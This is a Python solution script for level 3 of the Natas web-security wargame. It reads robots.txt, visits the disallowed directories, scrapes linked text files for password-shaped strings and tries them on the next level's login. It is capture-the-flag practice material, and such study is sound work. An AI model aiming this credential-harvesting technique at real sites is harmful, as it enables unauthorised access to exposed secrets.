import re
import requests
from bs4 import BeautifulSoup
from natas_utils import *

LEVEL = 3
LEVEL_URL, LOGIN = load_level(LEVEL)

def main():
    robots = requests.get(LEVEL_URL + "/robots.txt", auth=LOGIN)
    robots.raise_for_status()

    # print(robots.text)

    forbidden_paths = [line.split()[1] for line in filter(lambda l: l.startswith("Disallow"), robots.text.split('\n'))]

    candidate_passwords = list()

    for path in forbidden_paths:
        response = requests.get(LEVEL_URL + path, auth=LOGIN)
        soup = BeautifulSoup(response.text, "html.parser")

        filename_elems = soup.find_all("a", attrs={"href": re.compile(r"\.txt$")}, recursive=True)

        for elem in filename_elems:
            filename = elem.text
            response = requests.get(LEVEL_URL + path + filename, auth=LOGIN)

            matches = re.findall(PW_FORMAT, response.text)
            if len(matches) >= 1:
                candidate_passwords.extend(matches)

    natas4_password = try_level_login(LEVEL + 1, candidate_passwords)

    if natas4_password:
        print("natas4:", natas4_password)
        store_level_password(LEVEL + 1, natas4_password)

if __name__ == "__main__":
    main()